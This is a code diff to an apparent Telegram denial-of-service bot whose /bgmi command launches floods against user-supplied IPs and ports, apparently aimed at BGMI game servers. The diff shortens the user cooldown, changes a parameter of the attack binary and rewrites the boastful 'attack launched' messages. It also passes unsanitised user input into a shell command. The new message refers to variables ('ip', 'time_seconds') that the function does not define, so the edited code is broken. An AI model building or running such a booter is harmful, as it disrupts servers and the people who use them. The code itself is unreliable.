@@ -264,17 +264,17 @@ def start_attack_reply(message, target, port, time):
     user_info = message.from_user
     username = user_info.username if user_info.username else user_info.first_name
     
-    response = f"🚀𝗬𝗢𝗨𝗥 𝗜𝗣 𝗖𝗛𝗔𝗡𝗚𝗘𝗦 𝗘𝗩𝗘𝗥𝗬 𝟱 𝗦𝗘𝗖.😈"
+    response = f"𝐘𝐎𝐔𝐑 𝐈𝐏 𝐀𝐍𝐃 𝐏𝐎𝐑𝐓 𝐂𝐇𝐀𝐍𝐆𝐄𝐒 𝐈𝐍 𝐄𝐕𝐄𝐑𝐘 𝐌𝐀𝐓𝐂𝐇 \nNEXT ATTACK PROCESSING 🟢"
     
     bot.reply_to(message, response)
 
-    response = f"🚀𝘼𝙏𝙏𝘼𝘾𝙆 𝙎𝙏𝘼𝙍𝙏𝙀𝘿 𝘽𝙔 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘽𝙊𝙏 🚨🔫\n🎯𝙄𝙋: {target}\n🏖️𝙋𝙤𝙧𝙩: {port}\n⌚𝙏𝙞𝙢𝙚: {time} 𝙨𝙚𝙘\n👾𝐌𝐞𝐭𝐡𝐨𝐝:ˢᴱᴺᴰ ᶠᴱᴱᴰᴮᴬᶜᴷ ⏩ ᶠᴬˢᵀ ᵀᴱˢᵀᴵᴺᴳ ⭐ "
+    response = f"🚀𝘼𝙏𝙏𝘼𝘾𝙆 𝙇𝘼𝙐𝙉𝘾𝙃𝙀𝘿 🌠 \n𝐒𝐓𝐀𝐓𝐔𝐒 🟢 𝐘𝐎𝐔𝐑 𝐀𝐓𝐓𝐀𝐂𝐊 𝐇𝐀𝐒 𝐁𝐄𝐄𝐍 𝐒𝐄𝐍𝐓 𝐓𝐎 𝐁𝐆𝐌𝐈 𝐒𝐄𝐑𝐕𝐄𝐑 𝐏𝐈𝐍𝐆 677📶 \n🎯𝑻𝑨𝑹𝑮𝑬𝑻 𝑰𝑷: {ip} \n🛜𝙋𝙤𝙧𝙩: {port} \n🕰️𝙏𝙞𝙢𝙚: {time_seconds} 𝙨𝙚𝙘 \n𝐕𝐈𝐏 𝐌𝐄𝐓𝐇𝐎𝐃 : 𝐁𝐆𝐌𝐈 𝟑.𝟑 𝐀𝐍𝐃 𝟑.𝟒 \n 🚀𝗛𝗮𝗻𝗴 𝘁𝗶𝗴𝗵𝘁!𝗬𝗼𝘂𝗿 𝗮𝘁𝘁𝗮𝗰𝗸 𝗶𝘀 𝗶𝗻 𝗽𝗿𝗼𝗴𝗿𝗲𝘀𝘀...🚀 \n🌐𝗠𝗼𝗻𝗶𝘁𝗼𝗿𝗶𝗻𝗴 𝘁𝗵𝗲 𝘁𝗮𝗿𝗴𝗲𝘁 𝗳𝗼𝗿 𝗼𝗽𝘁𝗶𝗺𝗮𝗹 𝗽𝗲𝗿𝗳𝗼𝗿𝗺𝗮𝗻𝗰𝗲"
     bot.reply_to(message, response)
 
 # Dictionary to store the last time each user ran the /bgmi command
 bgmi_cooldown = {}
 
-COOLDOWN_TIME =100
+COOLDOWN_TIME =10
 
 # Join :- # Handler for /bgmi command
 @bot.message_handler(commands=['bgmi'])
@@ -284,8 +284,8 @@ def handle_bgmi(message):
         # Join :- @MrHellenG # Check if the user is in admin_id (admins have no cooldown)
         if user_id not in admin_id:
             # Join :- @MrHellenG # Check if the user has run the command before and is still within the cooldown period
-            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds <100:
-                response = "𝗬𝗼𝘂 𝗔𝗿𝗲 𝗢𝗻 𝗖𝗼𝗼𝗹𝗱𝗼𝘄𝗻 . 𝗣𝗹𝗲𝗮𝘀𝗲 𝗪𝗮𝗶𝘁 100 Seconds 𝗕𝗲𝗳𝗼𝗿𝗲 𝗥𝘂𝗻𝗻𝗶𝗻𝗴 𝗧𝗵𝗲 /bgmi 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 𝗔𝗴𝗮𝗶𝗻."
+            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds <10:
+                response = "𝗬𝗼𝘂 𝗔𝗿𝗲 𝗢𝗻 𝗖𝗼𝗼𝗹𝗱𝗼𝘄𝗻 . 𝗣𝗹𝗲𝗮𝘀𝗲 𝗪𝗮𝗶𝘁 10 Seconds 𝗕𝗲𝗳𝗼𝗿𝗲 𝗥𝘂𝗻𝗻𝗶𝗻𝗴 𝗧𝗵𝗲 /bgmi 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 𝗔𝗴𝗮𝗶𝗻."
                 bot.reply_to(message, response)
                 return
             # Join :- @MrHellenG # Update the last time the user ran the command
@@ -302,7 +302,7 @@ def handle_bgmi(message):
                 record_command_logs(user_id, '/bgmi', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Join :- @MrHellenG# Call start_attack_reply function
-                full_command = f"./bgmi {target} {port} {time} 900"
+                full_command = f"./bgmi {target} {port} {time} 60"
                 subprocess.run(full_command, shell=True)
                 response = f"🚀𝘼𝙩𝙩𝙖𝙘𝙠 𝙤𝙣 ☄️ {target}:{port}\n🎉𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚𝙙 🎊𝙎𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮🥳"
         else:
